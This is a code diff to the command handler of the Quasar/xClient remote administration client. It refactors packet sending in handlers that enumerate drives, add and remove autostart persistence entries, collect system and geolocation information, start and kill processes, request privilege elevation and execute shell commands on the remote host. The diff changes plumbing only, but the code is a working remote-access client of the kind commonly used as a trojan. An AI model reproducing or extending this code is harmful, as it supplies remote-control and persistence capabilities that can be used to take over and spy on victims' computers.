@@ -6,20 +6,21 @@ using System.Linq;
 using System.Net.NetworkInformation;
 using System.Windows.Forms;
 using Microsoft.Win32;
+using Quasar.Common.Enums;
+using Quasar.Common.Packets;
 using xClient.Config;
 using xClient.Core.Data;
 using xClient.Core.Extensions;
 using xClient.Core.Helper;
 using xClient.Core.Networking;
 using xClient.Core.Utilities;
-using xClient.Enums;
 
 namespace xClient.Core.Commands
 {
     /* THIS PARTIAL CLASS SHOULD CONTAIN METHODS THAT MANIPULATE THE SYSTEM (drives, directories, files, etc.). */
     public static partial class CommandHandler
     {
-        public static void HandleGetDrives(Packets.ServerPackets.GetDrives command, Client client)
+        public static void HandleGetDrives(GetDrives command, Client client)
         {
             DriveInfo[] drives;
             try
@@ -28,18 +29,18 @@ namespace xClient.Core.Commands
             }
             catch (IOException)
             {
-                new Packets.ClientPackets.SetStatusFileManager("GetDrives I/O error", false).Execute(client);
+                client.Send(new SetStatusFileManager {Message = "GetDrives I/O error", SetLastDirectorySeen = false});
                 return;
             }
             catch (UnauthorizedAccessException)
             {
-                new Packets.ClientPackets.SetStatusFileManager("GetDrives No permission", false).Execute(client);
+                client.Send(new SetStatusFileManager {Message = "GetDrives No permission", SetLastDirectorySeen = false});
                 return;
             }
 
             if (drives.Length == 0)
             {
-                new Packets.ClientPackets.SetStatusFileManager("GetDrives No drives", false).Execute(client);
+                client.Send(new SetStatusFileManager {Message = "GetDrives No drives", SetLastDirectorySeen = false});
                 return;
             }
 
@@ -69,10 +70,10 @@ namespace xClient.Core.Commands
                 rootDirectory[i] = drives[i].RootDirectory.FullName;
             }
 
-            new Packets.ClientPackets.GetDrivesResponse(displayName, rootDirectory).Execute(client);
+            client.Send(new GetDrivesResponse {DriveDisplayName = displayName, RootDirectory = rootDirectory});
         }
 
-        public static void HandleDoShutdownAction(Packets.ServerPackets.DoShutdownAction command, Client client)
+        public static void HandleDoShutdownAction(DoShutdownAction command, Client client)
         {
             try
             {
@@ -100,11 +101,11 @@ namespace xClient.Core.Commands
             }
             catch (Exception ex)
             {
-                new Packets.ClientPackets.SetStatus(string.Format("Action failed: {0}", ex.Message)).Execute(client);
+                client.Send(new SetStatus {Message = $"Action failed: {ex.Message}"});
             }
         }
 
-        public static void HandleGetStartupItems(Packets.ServerPackets.GetStartupItems command, Client client)
+        public static void HandleGetStartupItems(GetStartupItems command, Client client)
         {
             try
             {
@@ -164,15 +165,15 @@ namespace xClient.Core.Commands
                                           select "6" + formattedKeyValue);
                 }
 
-                new Packets.ClientPackets.GetStartupItemsResponse(startupItems).Execute(client);
+                client.Send(new GetStartupItemsResponse {StartupItems = startupItems});
             }
             catch (Exception ex)
             {
-                new Packets.ClientPackets.SetStatus(string.Format("Getting Autostart Items failed: {0}", ex.Message)).Execute(client);
+                client.Send(new SetStatus {Message = $"Getting Autostart Items failed: {ex.Message}"});
             }
         }
 
-        public static void HandleDoStartupItemAdd(Packets.ServerPackets.DoStartupItemAdd command, Client client)
+        public static void HandleDoStartupItemAdd(DoStartupItemAdd command, Client client)
         {
             try
             {
@@ -248,11 +249,11 @@ namespace xClient.Core.Commands
             }
             catch (Exception ex)
             {
-                new Packets.ClientPackets.SetStatus(string.Format("Adding Autostart Item failed: {0}", ex.Message)).Execute(client);
+                client.Send(new SetStatus {Message = $"Adding Autostart Item failed: {ex.Message}"});
             }
         }
 
-        public static void HandleDoStartupItemRemove(Packets.ServerPackets.DoStartupItemRemove command, Client client)
+        public static void HandleDoStartupItemRemove(DoStartupItemRemove command, Client client)
         {
             try
             {
@@ -318,11 +319,11 @@ namespace xClient.Core.Commands
             }
             catch (Exception ex)
             {
-                new Packets.ClientPackets.SetStatus(string.Format("Removing Autostart Item failed: {0}", ex.Message)).Execute(client);
+                client.Send(new SetStatus {Message = $"Removing Autostart Item failed: {ex.Message}"});
             }
         }
 
-        public static void HandleGetSystemInfo(Packets.ServerPackets.GetSystemInfo command, Client client)
+        public static void HandleGetSystemInfo(GetSystemInfo command, Client client)
         {
             try
             {
@@ -372,14 +373,14 @@ namespace xClient.Core.Commands
                     GeoLocationHelper.GeoInfo.Isp
                 };
 
-                new Packets.ClientPackets.GetSystemInfoResponse(infoCollection).Execute(client);
+                client.Send(new GetSystemInfoResponse {SystemInfos = infoCollection});
             }
             catch
             {
             }
         }
 
-        public static void HandleGetProcesses(Packets.ServerPackets.GetProcesses command, Client client)
+        public static void HandleGetProcesses(GetProcesses command, Client client)
         {
             Process[] pList = Process.GetProcesses();
             string[] processes = new string[pList.Length];
@@ -395,14 +396,14 @@ namespace xClient.Core.Commands
                 i++;
             }
 
-            new Packets.ClientPackets.GetProcessesResponse(processes, ids, titles).Execute(client);
+            client.Send(new GetProcessesResponse {Processes = processes, Ids = ids, Titles = titles});
         }
 
-        public static void HandleDoProcessStart(Packets.ServerPackets.DoProcessStart command, Client client)
+        public static void HandleDoProcessStart(DoProcessStart command, Client client)
         {
-            if (string.IsNullOrEmpty(command.Processname))
+            if (string.IsNullOrEmpty(command.ApplicationName))
             {
-                new Packets.ClientPackets.SetStatus("Process could not be started!").Execute(client);
+                client.Send(new SetStatus {Message = "Process could not be started!"});
                 return;
             }
 
@@ -411,36 +412,36 @@ namespace xClient.Core.Commands
                 ProcessStartInfo startInfo = new ProcessStartInfo
                 {
                     UseShellExecute = true,
-                    FileName = command.Processname
+                    FileName = command.ApplicationName
                 };
                 Process.Start(startInfo);
             }
             catch
             {
-                new Packets.ClientPackets.SetStatus("Process could not be started!").Execute(client);
+                client.Send(new SetStatus {Message = "Process could not be started!"});
             }
             finally
             {
-                HandleGetProcesses(new Packets.ServerPackets.GetProcesses(), client);
+                HandleGetProcesses(new GetProcesses(), client);
             }
         }
 
-        public static void HandleDoProcessKill(Packets.ServerPackets.DoProcessKill command, Client client)
+        public static void HandleDoProcessKill(DoProcessKill command, Client client)
         {
             try
             {
-                Process.GetProcessById(command.PID).Kill();
+                Process.GetProcessById(command.Pid).Kill();
             }
             catch
             {
             }
             finally
             {
-                HandleGetProcesses(new Packets.ServerPackets.GetProcesses(), client);
+                HandleGetProcesses(new GetProcesses(), client);
             }
         }
 
-        public static void HandleDoAskElevate(Packets.ServerPackets.DoAskElevate command, Client client)
+        public static void HandleDoAskElevate(DoAskElevate command, Client client)
         {
             if (WindowsAccountHelper.GetAccountType() != "Admin")
             {
@@ -460,7 +461,7 @@ namespace xClient.Core.Commands
                 }
                 catch
                 {
-                    new Packets.ClientPackets.SetStatus("User refused the elevation request.").Execute(client);
+                    client.Send(new SetStatus {Message = "User refused the elevation request."});
                     MutexHelper.CreateMutex(Settings.MUTEX);  // re-grab the mutex
                     return;
                 }
@@ -468,11 +469,11 @@ namespace xClient.Core.Commands
             }
             else
             {
-                new Packets.ClientPackets.SetStatus("Process already elevated.").Execute(client);
+                client.Send(new SetStatus {Message = "Process already elevated."});
             }
         }
         
-        public static void HandleDoShellExecute(Packets.ServerPackets.DoShellExecute command, Client client)
+        public static void HandleDoShellExecute(DoShellExecute command, Client client)
         {
             string input = command.Command;
 
